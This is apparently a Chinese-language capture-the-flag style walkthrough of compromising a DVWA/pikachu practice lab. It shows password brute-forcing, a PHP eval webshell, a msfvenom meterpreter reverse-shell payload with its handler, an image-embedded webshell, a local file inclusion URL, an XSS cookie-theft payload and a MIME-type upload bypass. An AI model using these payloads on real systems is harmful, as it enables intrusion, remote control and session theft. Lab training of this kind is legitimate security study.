# 从DVWA和pikachu上获得getshell

@[toc]

# nmap扫描

```
nmap -sV -O -A -T4 192.168.1.9 
```

可以看到扫描结果中有3个端口是打开的，分别为22、25、80端口，并且可以看到目标主机用的是Linux系统

![image-20211224094719057](https://gitee.com/xxb667/img/raw/master/img/image-20211224094719057.png)

# 用御剑后台进行扫描

目标靶机地址

```
192.168.1.9
```

扫描结果如下：

![image-20211224093215337](https://gitee.com/xxb667/img/raw/master/img/image-20211224093215337.png)

## 进入登录界面

```
http://192.168.1.9/phpmyadmin/db_create.php
```

![image-20211224093414409](https://gitee.com/xxb667/img/raw/master/img/image-20211224093414409.png)

### 对账户密码进行暴力破解

打开burp suite对网页信息进行拦截

![image-20211224093634184](https://gitee.com/xxb667/img/raw/master/img/image-20211224093634184.png)

拦截到的账户密码信息

![image-20211224093703658](https://gitee.com/xxb667/img/raw/master/img/image-20211224093703658.png)

进入Intruder后，对【有效载荷集】进行设置后，进行暴力破解

![image-20211224093909183](https://gitee.com/xxb667/img/raw/master/img/image-20211224093909183.png)

暴力破解结果如下:

得到账户和密码

```
账户：root
密码：123456
```

![image-20211224100209247](https://gitee.com/xxb667/img/raw/master/img/image-20211224100209247.png)

# 方法1 从DVWA上获得getshell进行渗透

## 登录phpMyAdmin

### 进入靶场界面

```
http://192.168.1.9/index.html
```



![image-20211225131354372](https://gitee.com/xxb667/img/raw/master/img/image-20211225131354372.png)

### 登录DVWA界面

![image-20211225131810350](https://gitee.com/xxb667/img/raw/master/img/image-20211225131810350.png)



原本的账户密码：

```
账户：admin
密码：password
```

由于开始登录上面显示的账户密码未成功登录进去

所以我在phpMyAdmin查看DVWA数据库中的账户和密码

```
账户：admin
密码：7890
MD5码：cdaeb1282d614772beb1e74c192bebda

```

![image-20211224111201720](https://gitee.com/xxb667/img/raw/master/img/image-20211224111201720.png)

![image-20211224123811907](https://gitee.com/xxb667/img/raw/master/img/image-20211224123811907.png)

### 修改权限为low

![image-20211224124912120](https://gitee.com/xxb667/img/raw/master/img/image-20211224124912120.png)

### 上传一句话木马

```
<?php @eval($_POST["xxb"]);?>
```

木马文件名为xxb.php

![image-20211224131438934](https://gitee.com/xxb667/img/raw/master/img/image-20211224131438934.png)

### 用蚁剑进行连接

```
http://192.168.1.9/01/hackable/uploads/xxb.php
```

![image-20211224131310552](https://gitee.com/xxb667/img/raw/master/img/image-20211224131310552.png)

连接成功后进入界面

![image-20211224131628811](https://gitee.com/xxb667/img/raw/master/img/image-20211224131628811.png)

### 用kali生成木马文件

```
 msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.38 LPORT=4444 -b "\x00" -f elf -o /home/xxb1/123
```

开启kali的apache服务

```
systemctl start apache2
```

kali设置监听

```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.38
set LPORT 4444
exploit
```

![image-20211224132107558](https://gitee.com/xxb667/img/raw/master/img/image-20211224132107558.png)



### 用蚁剑上传木马文件

![image-20211224132248942](https://gitee.com/xxb667/img/raw/master/img/image-20211224132248942.png)

### 用kali进行监听

```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.38
set LPORT 4444
exploit
```

![image-20211224135025283](https://gitee.com/xxb667/img/raw/master/img/image-20211224135025283.png)



### 用中国蚁剑运行程序

- 连接成功后，在空白处右键

- 选择在【在此处打开终端】进入终端

- 然后运行自己上传的木马文件

  

```
chmod +x ./123 #赋予执行权限
./123 #运行程序
```

![image-20211224134816726](https://gitee.com/xxb667/img/raw/master/img/image-20211224134816726.png)



#### 返回kali进行查看

已经渗透成功

![image-20211224134727886](https://gitee.com/xxb667/img/raw/master/img/image-20211224134727886.png)



#### 查找flag文件

```
search -f flag
```

查看到文件在

```
/etc/flag
```

![image-20211224141252599](https://gitee.com/xxb667/img/raw/master/img/image-20211224141252599.png)

进入蚁剑进行信息查看

```
flag{qwer-xxx-123456}
```

![image-20211224141508694](https://gitee.com/xxb667/img/raw/master/img/image-20211224141508694.png)



# 方法2 利用pikachu的MIME进行绕过

## 思路1 生成木马图片

我们需要将上传文件的文件头伪装成图片，首先利用`copy命令`将一句话木马文件`Hack.php`与正常的图片文件`ClearSky.jpg`合并：

【备注】以下为CMD下用copy命令制作“**图片木马**”的步骤，其中，`ClearSky.jpg/b`中“b”表示“**二进制文件**”，`hack.php/a`中“a"表示**ASCII码文件**。

```
copy 1.jpeg/b+xxb.php/a xxb.jpg
```

![image-20211224143014174](https://gitee.com/xxb667/img/raw/master/img/image-20211224143014174.png)

进入文件夹进行查看

![image-20211224143228549](https://gitee.com/xxb667/img/raw/master/img/image-20211224143228549.png)

用记事本打开图片

可以看到一句话木马已经嵌入进去

![image-20211224143446873](https://gitee.com/xxb667/img/raw/master/img/image-20211224143446873.png)

### 用蚁剑进行连接

```
http://192.168.1.9/06/vul/unsafeupload/uploads/xxb2.jpg
```

但是发现蚁剑连接不通，说明.php文件未嵌入成功。

![image-20211224162815473](https://gitee.com/xxb667/img/raw/master/img/image-20211224162815473.png)

#### 原因

**此时虽然图片马里面是含有PHP木马的，如果我们直接用中国蚁剑连接的话是不行的，因为他目前还是图片，只有服务器把它当作PHP文件解析的时候木马才行执行。**

### 结合文件上传漏洞getshell

由于只能用php 的file协议 所以我们构造的payload 为：

```
http://192.168.81.135/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/uploads/m.jpg

```

直接在浏览器中打开

而且解析的图片马路径必须是绝对路径 ，相对路径读不出来。

![image-20211230102220450](https://gitee.com/xxb667/img/raw/master/img/image-20211230102220450.png)



在浏览器中查看一下，已经成功解析。

### cookie信息获得

```
<img src=x onerror=document.write(document.cookie)>
```

cookie信息

```
security=high; BEEFHOOK=bL0Ggh9cqdUdBju360HJN0Zb4uRC3fyfoQktVY7IMeWkyAfFzZzUSGV0njb71GRSIZJYG1qnw1PYZQSN; PHPSESSID=0j47o0djep2nbr0vecgtdn8053
```

蚁剑连接：  加上cookie信息

![image-20211230102349294](https://gitee.com/xxb667/img/raw/master/img/image-20211230102349294.png)



![image-20211230102459649](https://gitee.com/xxb667/img/raw/master/img/image-20211230102459649.png)

### 再次用蚁剑进行连接

连接成功

![image-20211230103055923](https://gitee.com/xxb667/img/raw/master/img/image-20211230103055923.png)





## 思路2 进行绕过

### 正常图片上传

首先上传一个正常的图片，用burp suite进行信息抓取

查看文件类型为

```
Content-Type: image/jpeg
```

![image-20211224163138818](https://gitee.com/xxb667/img/raw/master/img/image-20211224163138818.png)



![image-20211224160911755](https://gitee.com/xxb667/img/raw/master/img/image-20211224160911755.png)

### 上传.php文件

上传.php文件，然后用burp suite进行抓取

此时它的图片类型为：

```
Content-Type: application/octet-stream
```

然后我们把这个图片类型改成正常图片的类型

```
Content-Type: image/jpeg
```

然后点击【发送】，转到页面可以看到.php文件已经成功上传

![image-20211224161255191](https://gitee.com/xxb667/img/raw/master/img/image-20211224161255191.png)

修改为正常的图片类型

![image-20211224161924799](https://gitee.com/xxb667/img/raw/master/img/image-20211224161924799.png)

返回页面进行查看，.php已经成功上传

![image-20211224161400612](https://gitee.com/xxb667/img/raw/master/img/image-20211224161400612.png)

## 用蚁剑进行连接

这个文件路径是试过来的

```
http://192.168.1.9/06/vul/unsafeupload/uploads/xxb.php
```

![image-20211224164515696](https://gitee.com/xxb667/img/raw/master/img/image-20211224164515696.png)

### 上传木马文件

木马文件名为 

```
123
```

![image-20211224164713477](https://gitee.com/xxb667/img/raw/master/img/image-20211224164713477.png)

### 用kali进行监听

```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.38
set LPORT 4444
exploit
```

![image-20211224164953663](https://gitee.com/xxb667/img/raw/master/img/image-20211224164953663.png)

### 用中国蚁剑运行程序

- 连接成功后，在空白处右键

- 选择在【在此处打开终端】进入终端

- 然后运行自己上传的木马文件

  ```
  chmod +x ./123 #赋予执行权限
  ./123 #运行程序
  ```

  ![image-20211224165434634](https://gitee.com/xxb667/img/raw/master/img/image-20211224165434634.png)



### 返回kali进行查看

已经渗透成功

![image-20211224165715091](https://gitee.com/xxb667/img/raw/master/img/image-20211224165715091.png)

#### 查找flag文件

```
search -f flag
```

查看到文件在

```
/etc/flag
```

![image-20211224165957696](https://gitee.com/xxb667/img/raw/master/img/image-20211224165957696.png)

进入蚁剑进行查看

flag信息如下

```
flag{qwer-xxx-123456}
```

![image-20211224170130443](https://gitee.com/xxb667/img/raw/master/img/image-20211224170130443.png)



